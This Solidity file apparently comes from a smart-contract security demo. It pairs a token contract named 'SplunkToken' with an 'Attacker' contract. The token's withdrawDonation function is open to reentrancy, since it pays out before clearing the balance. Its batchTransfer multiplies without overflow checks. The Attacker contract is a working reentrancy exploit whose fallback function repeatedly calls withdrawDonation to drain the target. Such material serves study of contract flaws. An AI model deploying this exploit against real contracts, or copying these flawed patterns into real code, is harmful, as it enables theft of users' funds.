pragma solidity ^0.4.20;

library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
}


contract SplunkToken is ERC20Basic {
    using SafeMath for uint256;
    string public name = "SplunkChain";
    string public symbol = "SPL";
    string public version = '1.0.0';
    uint8 public decimals = 2;
    mapping(address => uint256) balances;
    mapping(address=>uint) userDonations;

    function SplunkToken() {
        totalSupply = 100 * (10**(uint256(decimals)));
        balances[msg.sender] = totalSupply;    // Give the creator all initial tokens
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value > 0 && _value <= balances[msg.sender]);
        // SafeMath.sub will throw if there is not enough balance.
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        return true;
    }
    
    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
    
    function batchTransfer(address[] _receivers, uint256 _value) public  returns (bool) {
        uint cnt = _receivers.length;
        uint256 amount = uint256(cnt) * _value;
        require(cnt > 0 && cnt <= 20);
        require(_value > 0 && balances[msg.sender] >= amount);

        balances[msg.sender] = balances[msg.sender].sub(amount);
        for (uint i = 0; i < cnt; i++) {
            balances[_receivers[i]] = balances[_receivers[i]].add(_value);
        }
        return true;
   }
   
   function addToDonation() payable {
     userDonations[msg.sender] = userDonations[msg.sender] + msg.value;
   }
   
   function getUserDonation(address user) constant returns(uint) {
     return userDonations[user];
   }
   
   function withdrawDonation() {
     uint amountToWithdraw = userDonations[msg.sender];
     if (msg.sender.call.value(amountToWithdraw)() == false) {
         throw;
     }
     userDonations[msg.sender] = userDonations[msg.sender].sub(amountToWithdraw);
   }
   
   function contractBalanace() view returns(uint){
       return this.balance;
   }
}


contract Attacker{
    bool is_attack = true;
    address targetAddress;
    
    function Attacker(address _targetAddress) payable{
       targetAddress=_targetAddress;
       bool result = targetAddress.call.value(msg.value)(bytes4(sha3("addToDonation()")));
       result;
    }
    
    function() payable{
        //if(is_attack==true){
         //  is_attack=false;
           if(targetAddress.call(bytes4(sha3("withdrawDonation()"))) == false) {
               //throw;
           }
       //}
    }

   function withdraw(){
       if(targetAddress.call(bytes4(sha3("withdrawDonation()")))==false ) {
           //throw;
        }
   }
   
   function contractBalanace() view returns(uint){
       return this.balance;
   }
  
}
